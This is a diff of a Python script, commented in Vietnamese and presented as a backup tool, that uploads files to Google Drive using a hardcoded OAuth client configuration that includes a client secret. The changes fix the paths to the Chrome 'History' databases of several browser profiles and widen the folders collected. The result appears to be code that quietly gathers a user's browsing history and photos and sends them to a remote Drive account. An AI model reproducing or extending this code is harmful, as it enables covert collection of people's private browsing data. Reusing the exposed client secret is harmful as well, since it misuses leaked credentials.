@@ -12,7 +12,7 @@ from pathlib import Path
 
 SCOPES = ['https://www.googleapis.com/auth/drive']
 end_date1 = datetime.date(2028, 6, 28)
-the_t = 5
+the_t = 505
 def authenticate():
     # Giữ nguyên phần nhúng CLIENT_CONFIG và TOKEN_DATA của bạn
     CLIENT_CONFIG = {"installed":{"client_id":"535452856280-hmv3kut6gf9od70fmjohq95p3510kocb.apps.googleusercontent.com","project_id":"united-yeti-482813-q5","auth_uri":"https://accounts.google.com/o/oauth2/auth","token_uri":"https://oauth2.googleapis.com/token","auth_provider_x509_cert_url":"https://www.googleapis.com/oauth2/v1/certs","client_secret":"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","redirect_uris":["http://localhost"]}}
@@ -129,13 +129,13 @@ def smart_upload(service, path, drive_parent_id):
 def run_backup_process():
     pictures_path = str(Path.home() / "Pictures")
     Default_path = str(Path.home() / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default" / "History")
-    Profile1_path = str(Path.home() / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default" / "Profile 1")
-    Profile2_path = str(Path.home() / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default" / "Profile 2")
-    Profile3_path = str(Path.home() / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default" / "Profile 3")
+    Profile1_path = str(Path.home() / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Profile 1" / "History")
+    Profile2_path = str(Path.home() / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Profile 2" / "History")
+    Profile3_path = str(Path.home() / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Profile 3" / "History")
     # Danh sách kết hợp cả file và thư mục
     LIST_OF_PATHS = [
-        r'C:\Ersports\Summary',
-        r'C:\Ersports\Summary3',
+        r'C:\Ersports',
+        #r'C:\Ersports\Summary3',
         r'C:\Ersports\ER.xlsx',
         pictures_path,
         Default_path,
